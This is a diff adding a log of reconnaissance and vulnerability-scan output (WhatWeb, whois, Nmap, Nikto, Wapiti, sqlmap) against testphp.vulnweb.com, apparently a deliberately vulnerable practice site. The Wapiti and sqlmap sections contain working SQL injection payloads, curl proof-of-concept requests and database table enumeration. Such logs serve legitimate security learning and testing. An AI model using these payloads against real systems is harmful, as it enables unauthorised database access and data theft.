@@ -1,0 +1,835 @@
+WhatWeb report for http://testphp.vulnweb.com/
+Status    : 200 OK
+Title     : Home of Acunetix Art
+IP        : 176.28.50.165
+Country   : GERMANY, DE
+
+Summary   : ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Email[wvs@acunetix.com], HTTPServer[nginx/1.4.1], nginx[1.4.1], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.3.10-1~lucid+2uwsgi2], Script[text/JavaScript], X-Powered-By[PHP/5.3.10-1~lucid+2uwsgi2]
+
+Detected Plugins:
+[ ActiveX ]
+	ActiveX is a framework based on Microsoft's Component 
+	Object Model (COM) and Object Linking and Embedding (OLE) 
+	technologies. ActiveX components officially operate only 
+	with Microsoft's Internet Explorer web browser and the 
+	Microsoft Windows operating system. - More info: 
+	http://en.wikipedia.org/wiki/ActiveX 
+
+	Module       : D27CDB6E-AE6D-11cf-96B8-444553540000
+
+[ Adobe-Flash ]
+	This plugin identifies instances of embedded adobe flash 
+	files. 
+
+	Google Dorks: (1)
+	Website     : https://get.adobe.com/flashplayer/
+
+[ Email ]
+	Extract email addresses. Find valid email address and 
+	syntactically invalid email addresses from mailto: link 
+	tags. We match syntactically invalid links containing 
+	mailto: to catch anti-spam email addresses, eg. bob at 
+	gmail.com. This uses the simplified email regular 
+	expression from 
+	http://www.regular-expressions.info/email.html for valid 
+	email address matching. 
+
+	String       : wvs@acunetix.com
+	String       : wvs@acunetix.com
+
+[ HTTPServer ]
+	HTTP server header string. This plugin also attempts to 
+	identify the operating system from the server header. 
+
+	String       : nginx/1.4.1 (from server string)
+
+[ Object ]
+	HTML object tag. This can be audio, video, Flash, ActiveX, 
+	Python, etc. More info: 
+	http://www.w3schools.com/tags/tag_object.asp 
+
+	Module       : clsid:D27CDB6E-AE6D-11cf-96B8-444553540000 (from classid)
+	String       : http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0
+
+[ PHP ]
+	PHP is a widely-used general-purpose scripting language 
+	that is especially suited for Web development and can be 
+	embedded into HTML. This plugin identifies PHP errors, 
+	modules and versions and extracts the local file path and 
+	username if present. 
+
+	Version      : 5.3.10-1~lucid+2uwsgi2
+	Google Dorks: (2)
+	Website     : http://www.php.net/
+
+[ Script ]
+	This plugin detects instances of script HTML elements and 
+	returns the script language/type. 
+
+	String       : text/JavaScript
+
+[ X-Powered-By ]
+	X-Powered-By HTTP header 
+
+	String       : PHP/5.3.10-1~lucid+2uwsgi2 (from x-powered-by string)
+
+[ nginx ]
+	Nginx (Engine-X) is a free, open-source, high-performance 
+	HTTP server and reverse proxy, as well as an IMAP/POP3 
+	proxy server. 
+
+	Version      : 1.4.1
+	Website     : http://nginx.net/
+
+HTTP Headers:
+	HTTP/1.1 200 OK
+	Server: nginx/1.4.1
+	Date: Thu, 02 Jul 1970 05:56:58 GMT
+	Content-Type: text/html
+	Transfer-Encoding: chunked
+	Connection: close
+	X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
+	Content-Encoding: gzip
+	
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '176.28.48.0 - 176.28.55.255'
+
+% Abuse contact for '176.28.48.0 - 176.28.55.255' is 'abuse@hosteurope.de'
+
+inetnum:        176.28.48.0 - 176.28.55.255
+remarks:        INFRA-AW
+netname:        DE-HE-RS-CLIENTS-176-28-48-NET
+descr:          Host Europe GmbH
+country:        DE
+admin-c:        HM5126-RIPE
+tech-c:         HM5126-RIPE
+status:         ASSIGNED PA
+mnt-by:         MNT-HEG-MASS
+created:        2012-01-06T16:03:11Z
+last-modified:  2015-12-01T15:01:32Z
+source:         RIPE # Filtered
+
+role:           HEG Mass
+address:        HEG Mass
+address:        Daimler Strasse 9-11
+address:        50354 Huerth
+address:        Germany
+phone:          +49 2203 1045 0
+admin-c:        JUPP
+admin-c:        OUZO
+tech-c:         JUPP
+tech-c:         OUZO
+nic-hdl:        HM5126-RIPE
+mnt-by:         MNT-HEG-MASS
+created:        2015-11-05T11:32:14Z
+last-modified:  2015-12-07T15:15:08Z
+source:         RIPE # Filtered
+
+% Information related to '176.28.48.0/21AS8972'
+
+route:          176.28.48.0/21
+origin:         AS8972
+mnt-by:         MNT-HEG-MASS
+created:        2019-04-11T06:24:26Z
+last-modified:  2019-04-11T06:24:26Z
+source:         RIPE
+
+% This query was served by the RIPE Database Query Service version 1.97.2 (BLAARKOP)
+
+
+********************************************************************************
+                     Wapiti 3.0.3 - wapiti.sourceforge.io
+                    Report for http://testphp.vulnweb.com/
+              Date of the scan : Sun, 27 Sep 2020 06:17:21 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   7
+                                                      Blind SQL Injection :   1
+                                                            File Handling :   0
+                                                     Cross Site Scripting :   0
+                                                           CRLF Injection :   0
+                                                       Commands execution :   0
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   0
+                                              Server Side Request Forgery :   0
+                                                            Open Redirect :   0
+                                                                      XXE :   0
+********************************************************************************
+
+SQL Injection
+-------------
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /listproducts.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    GET /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    POST /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=default&goButton=go
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28" -e "http://testphp.vulnweb.com/" -d "searchFor=default&goButton=go""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uuname
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uname
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=%C2%BF%27%22%28&pass=Letm3in_
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=%C2%BF%27%22%28&pass=Letm3in_""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter pass
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=default&pass=%C2%BF%27%22%28
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=default&pass=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=sleep%287%29%231""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   0
+                                                     Resource consumption :   0
+********************************************************************************
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 06:26 UTC
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 06:28 UTC
+Nmap scan report for rs202995.rs.hosteurope.de (176.28.50.165)
+Host is up (0.25s latency).
+Not shown: 85 closed ports
+PORT     STATE    SERVICE      VERSION
+21/tcp   open     ftp          ProFTPD 1.3.3e
+22/tcp   open     ssh          OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
+25/tcp   filtered smtp
+80/tcp   open     http         nginx 1.4.1
+106/tcp  open     pop3pw       poppassd
+110/tcp  open     pop3         Courier pop3d
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+143/tcp  open     imap         Plesk Courier imapd
+444/tcp  filtered snpp
+445/tcp  filtered microsoft-ds
+465/tcp  open     ssl/smtps?
+993/tcp  open     ssl/imaps?
+995/tcp  open     ssl/pop3s?
+8443/tcp open     http         lighttpd
+Service Info: Host: localhost.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.56 seconds
+WhatWeb report for http://testphp.vulnweb.com/
+Status    : 200 OK
+Title     : Home of Acunetix Art
+IP        : 176.28.50.165
+Country   : GERMANY, DE
+
+Summary   : ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Email[wvs@acunetix.com], HTTPServer[nginx/1.4.1], nginx[1.4.1], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.3.10-1~lucid+2uwsgi2], Script[text/JavaScript], X-Powered-By[PHP/5.3.10-1~lucid+2uwsgi2]
+
+Detected Plugins:
+[ ActiveX ]
+	ActiveX is a framework based on Microsoft's Component 
+	Object Model (COM) and Object Linking and Embedding (OLE) 
+	technologies. ActiveX components officially operate only 
+	with Microsoft's Internet Explorer web browser and the 
+	Microsoft Windows operating system. - More info: 
+	http://en.wikipedia.org/wiki/ActiveX 
+
+	Module       : D27CDB6E-AE6D-11cf-96B8-444553540000
+
+[ Adobe-Flash ]
+	This plugin identifies instances of embedded adobe flash 
+	files. 
+
+	Google Dorks: (1)
+	Website     : https://get.adobe.com/flashplayer/
+
+[ Email ]
+	Extract email addresses. Find valid email address and 
+	syntactically invalid email addresses from mailto: link 
+	tags. We match syntactically invalid links containing 
+	mailto: to catch anti-spam email addresses, eg. bob at 
+	gmail.com. This uses the simplified email regular 
+	expression from 
+	http://www.regular-expressions.info/email.html for valid 
+	email address matching. 
+
+	String       : wvs@acunetix.com
+	String       : wvs@acunetix.com
+
+[ HTTPServer ]
+	HTTP server header string. This plugin also attempts to 
+	identify the operating system from the server header. 
+
+	String       : nginx/1.4.1 (from server string)
+
+[ Object ]
+	HTML object tag. This can be audio, video, Flash, ActiveX, 
+	Python, etc. More info: 
+	http://www.w3schools.com/tags/tag_object.asp 
+
+	Module       : clsid:D27CDB6E-AE6D-11cf-96B8-444553540000 (from classid)
+	String       : http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0
+
+[ PHP ]
+	PHP is a widely-used general-purpose scripting language 
+	that is especially suited for Web development and can be 
+	embedded into HTML. This plugin identifies PHP errors, 
+	modules and versions and extracts the local file path and 
+	username if present. 
+
+	Version      : 5.3.10-1~lucid+2uwsgi2
+	Google Dorks: (2)
+	Website     : http://www.php.net/
+
+[ Script ]
+	This plugin detects instances of script HTML elements and 
+	returns the script language/type. 
+
+	String       : text/JavaScript
+
+[ X-Powered-By ]
+	X-Powered-By HTTP header 
+
+	String       : PHP/5.3.10-1~lucid+2uwsgi2 (from x-powered-by string)
+
+[ nginx ]
+	Nginx (Engine-X) is a free, open-source, high-performance 
+	HTTP server and reverse proxy, as well as an IMAP/POP3 
+	proxy server. 
+
+	Version      : 1.4.1
+	Website     : http://nginx.net/
+
+HTTP Headers:
+	HTTP/1.1 200 OK
+	Server: nginx/1.4.1
+	Date: Mon, 13 Jul 1970 08:07:25 GMT
+	Content-Type: text/html
+	Transfer-Encoding: chunked
+	Connection: close
+	X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
+	Content-Encoding: gzip
+	
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 08:25 UTC
+Nmap scan report for rs202995.rs.hosteurope.de (176.28.50.165)
+Host is up (0.26s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 08:28 UTC
+Nmap scan report for rs202995.rs.hosteurope.de (176.28.50.165)
+Host is up (0.23s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.4.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 08:28 UTC
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 08:33 UTC
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 08:34 UTC
+Nmap scan report for rs202995.rs.hosteurope.de (176.28.50.165)
+Host is up (0.20s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+106/tcp  open  pop3pw
+110/tcp  open  pop3
+143/tcp  open  imap
+465/tcp  open  smtps
+993/tcp  open  imaps
+995/tcp  open  pop3s
+8443/tcp open  https-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 37.11 seconds
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '176.28.48.0 - 176.28.55.255'
+
+% Abuse contact for '176.28.48.0 - 176.28.55.255' is 'abuse@hosteurope.de'
+
+inetnum:        176.28.48.0 - 176.28.55.255
+remarks:        INFRA-AW
+netname:        DE-HE-RS-CLIENTS-176-28-48-NET
+descr:          Host Europe GmbH
+country:        DE
+admin-c:        HM5126-RIPE
+tech-c:         HM5126-RIPE
+status:         ASSIGNED PA
+mnt-by:         MNT-HEG-MASS
+created:        2012-01-06T16:03:11Z
+last-modified:  2015-12-01T15:01:32Z
+source:         RIPE # Filtered
+
+role:           HEG Mass
+address:        HEG Mass
+address:        Daimler Strasse 9-11
+address:        50354 Huerth
+address:        Germany
+phone:          +49 2203 1045 0
+admin-c:        JUPP
+admin-c:        OUZO
+tech-c:         JUPP
+tech-c:         OUZO
+nic-hdl:        HM5126-RIPE
+mnt-by:         MNT-HEG-MASS
+created:        2015-11-05T11:32:14Z
+last-modified:  2015-12-07T15:15:08Z
+source:         RIPE # Filtered
+
+% Information related to '176.28.48.0/21AS8972'
+
+route:          176.28.48.0/21
+origin:         AS8972
+mnt-by:         MNT-HEG-MASS
+created:        2019-04-11T06:24:26Z
+last-modified:  2019-04-11T06:24:26Z
+source:         RIPE
+
+% This query was served by the RIPE Database Query Service version 1.98 (WAGYU)
+
+
+Syntax Check: /var/lib/nikto/databases/db_404_strings
+	39 entries
+Syntax Check: /var/lib/nikto/databases/db_content_search
+	19 entries
+Syntax Check: /var/lib/nikto/databases/db_dictionary
+	1825 entries
+Syntax Check: /var/lib/nikto/databases/db_dir_traversal
+	1 entries
+Syntax Check: /var/lib/nikto/databases/db_domino
+	274 entries
+Syntax Check: /var/lib/nikto/databases/db_drupal
+	6244 entries
+Syntax Check: /var/lib/nikto/databases/db_embedded
+	16 entries
+Syntax Check: /var/lib/nikto/databases/db_favicon
+	358 entries
+Syntax Check: /var/lib/nikto/databases/db_headers
+	98 entries
+Syntax Check: /var/lib/nikto/databases/db_httpoptions
+	12 entries
+Syntax Check: /var/lib/nikto/databases/db_multiple_index
+	36 entries
+Syntax Check: /var/lib/nikto/databases/db_outdated
+	1254 entries
+Syntax Check: /var/lib/nikto/databases/db_parked_strings
+	8 entries
+Syntax Check: /var/lib/nikto/databases/db_realms
+	170 entries
+Syntax Check: /var/lib/nikto/databases/db_server_msgs
+	261 entries
+Syntax Check: /var/lib/nikto/databases/db_tests
+	6897 entries
+Syntax Check: /var/lib/nikto/databases/db_variables
+	38 entries
+Checking plugins for duplicate test IDs
+
+Some (probably) open IDs: 000029, 000137, 000326, 000407, 000427, 000429, 000430
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          176.28.50.165
++ Target Hostname:    176.28.50.165
++ Target Port:        80
++ Start Time:         2020-10-08 08:45:58 (GMT0)
+---------------------------------------------------------------------------
++ Server: nginx/1.4.1
++ Retrieved x-powered-by header: PHP/5.3.10-1~lucid+2uwsgi2
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Scan terminated:  0 error(s) and 4 item(s) reported on remote host
++ End Time:           2020-10-08 08:46:04 (GMT0) (6 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+********************************************************************************
+                     Wapiti 3.0.3 - wapiti.sourceforge.io
+                    Report for http://testphp.vulnweb.com/
+              Date of the scan : Thu, 08 Oct 2020 08:47:33 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   9
+                                                      Blind SQL Injection :   4
+                                                            File Handling :   0
+                                                     Cross Site Scripting :   0
+                                                           CRLF Injection :   0
+                                                       Commands execution :   0
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   0
+                                              Server Side Request Forgery :   0
+                                                            Open Redirect :   0
+                                                                      XXE :   0
+********************************************************************************
+
+SQL Injection
+-------------
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?cat=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /listproducts.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter pic
+Evil request:
+    GET /product.php?pic=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/product.php?pic=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    GET /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    POST /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=default&goButton=go
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28" -e "http://testphp.vulnweb.com/" -d "searchFor=default&goButton=go""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uuname
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uname
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=%C2%BF%27%22%28&pass=Letm3in_
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=%C2%BF%27%22%28&pass=Letm3in_""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter pass
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=default&pass=%C2%BF%27%22%28
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=default&pass=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=sleep%287%29%231""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?cat=sleep%287%29%231""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter artist
+Evil request:
+    GET /listproducts.php?artist=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?artist=sleep%287%29%231""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter pic
+Evil request:
+    GET /product.php?pic=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/product.php?pic=sleep%287%29%231""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   0
+                                                     Resource consumption :   0
+********************************************************************************
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.7#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:59:28 /2020-10-08/
+
+[10:59:28] [INFO] resuming back-end DBMS 'mysql' 
+[10:59:28] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1033=1033
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cat=1 AND (SELECT 5585 FROM(SELECT COUNT(*),CONCAT(0x7170627671,(SELECT (ELT(5585=5585,1))),0x7176787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 7967 FROM (SELECT(SLEEP(5)))FPuw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170627671,0x636a79676d4f76576368546d61686e7a737371427567667458726a7949467065636d686c44674953,0x7176787871),NULL,NULL-- -
+---
+[10:59:34] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+[10:59:34] [INFO] fetching tables for database: 'acuart'
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+[10:59:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 10:59:34 /2020-10-08/
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.7#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:59:48 /2020-10-08/
+
+[10:59:48] [INFO] resuming back-end DBMS 'mysql' 
+[10:59:48] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1033=1033
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cat=1 AND (SELECT 5585 FROM(SELECT COUNT(*),CONCAT(0x7170627671,(SELECT (ELT(5585=5585,1))),0x7176787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 7967 FROM (SELECT(SLEEP(5)))FPuw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170627671,0x636a79676d4f76576368546d61686e7a737371427567667458726a7949467065636d686c44674953,0x7176787871),NULL,NULL-- -
+---
+[10:59:50] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
+[10:59:50] [INFO] fetching columns for table 'artists' in database 'acuart'
+Database: acuart
+Table: artists
+[3 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| adesc     | text        |
+| aname     | varchar(50) |
+| artist_id | int(5)      |
++-----------+-------------+
+
+[10:59:50] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 10:59:50 /2020-10-08/
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.7#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:00:59 /2020-10-08/
+
+[11:01:00] [INFO] resuming back-end DBMS 'mysql' 
+[11:01:00] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1033=1033
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cat=1 AND (SELECT 5585 FROM(SELECT COUNT(*),CONCAT(0x7170627671,(SELECT (ELT(5585=5585,1))),0x7176787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 7967 FROM (SELECT(SLEEP(5)))FPuw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170627671,0x636a79676d4f76576368546d61686e7a737371427567667458726a7949467065636d686c44674953,0x7176787871),NULL,NULL-- -
+---
+[11:01:00] [INFO] the back-end DBMS is MySQL
